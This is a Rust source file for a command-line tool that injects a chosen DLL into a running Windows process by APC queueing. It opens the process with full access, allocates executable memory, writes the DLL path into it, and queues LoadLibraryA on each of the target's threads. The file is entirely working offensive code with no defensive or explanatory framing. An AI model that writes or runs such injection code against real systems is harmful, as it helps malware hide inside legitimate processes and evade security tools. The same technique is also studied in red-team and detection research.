use std::{ptr, env};
use winapi::ctypes::c_void;
use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::tlhelp32::*;
use winapi::um::handleapi::*;

fn dll_injection(pid: u32, dll_path: &str, target_thread_id: u32) {
    unsafe{

        // Open target process
        let proc_handle = OpenProcess(0x000FFFFF, 
                                                    0, 
                                                       pid);

        // Allocate an RWE memory
        let remote_base = VirtualAllocEx(proc_handle, 
                                                     std::ptr::null_mut(), 
                                                        dll_path.len(), 
                                              0x00001000, 
                                                     0x40);
        
        // Write dll on memory
        WriteProcessMemory(proc_handle, 
                      remote_base, 
                           dll_path.as_bytes().as_ptr() as *const c_void, 
                              dll_path.len(), 
             std::ptr::null_mut());

        // Get LoadLibraryA address from kernel32.dll
        let dll_handle = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const i8);
        let ll_func = GetProcAddress(dll_handle, "LoadLibraryA\0".as_ptr() as *const i8);

        // Run dll in target thread
        let target_thread_handle = OpenThread(0x000FFFFF, 0, target_thread_id);
        QueueUserAPC(
            std::mem::transmute(ll_func),
            target_thread_handle,
            std::mem::transmute(remote_base),
        );
    }
}

fn get_thread_ids(pid: u32, mut thread_ids: Vec<u32>) -> Result<Vec<u32>, String> {
    unsafe {
        // Create a snapshot of the current processes
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        if snapshot == ptr::null_mut() {
            return Err("Failed to create snapshot".to_string());
        }

        // Initialize the THREADENTRY32 structure
        let mut thread_entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            cntUsage: 0,
            th32ThreadID: 0,
            th32OwnerProcessID: 0,
            tpBasePri: 0,
            tpDeltaPri: 0,
            dwFlags: 0,
        };

        // Find the first thread in the system
        if Thread32First(snapshot, &mut thread_entry) == 0 {
            return Err("Failed to get the first thread".to_string());
        }


        // Iterate through all threads in the system
        while Thread32Next(snapshot, &mut thread_entry) != 0 {
            if thread_entry.th32OwnerProcessID == pid {
                // Found a thread belonging to the specified process
                thread_ids.push(thread_entry.th32ThreadID);
            }
        }
        Ok(thread_ids)
    }
}

// This function prevents multiple injection by checking target modules
fn list_process_dlls(pid: u32, _continue: bool, dll_path: &str) -> bool {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);

        let mut module_entry: MODULEENTRY32 = std::mem::zeroed();
        module_entry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;

        if Module32First(snapshot, &mut module_entry) == winapi::shared::minwindef::TRUE {
            while Module32Next(snapshot, &mut module_entry) == winapi::shared::minwindef::TRUE {
                if std::ffi::CStr::from_ptr(module_entry.szExePath.as_ptr()).to_str().unwrap_or("") == dll_path {
                    return _continue == false
                }
            }
        }
        CloseHandle(snapshot);
        return _continue == true
    }
}

fn main() {

    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        eprintln!("Usage: {} <pid> <DLL Full Path>", args[0]);
        return;
    }

    let pid: u32 = args[1].parse().expect("Invalid PID");
    let dll_path = &args[2];
    let thread_ids: Vec<u32> = Vec::new();
    let mut _continue = true;
    
    match get_thread_ids(pid, thread_ids) {
        Ok(thread_ids) => {
            for thread in &thread_ids {
                if list_process_dlls(pid, _continue, dll_path) == true {
                    dll_injection(pid, dll_path, *thread);
                } else {
                    break;
                }
            }
        }
        Err(err) => {
            eprintln!("Error: {}", err);
        }
    }
}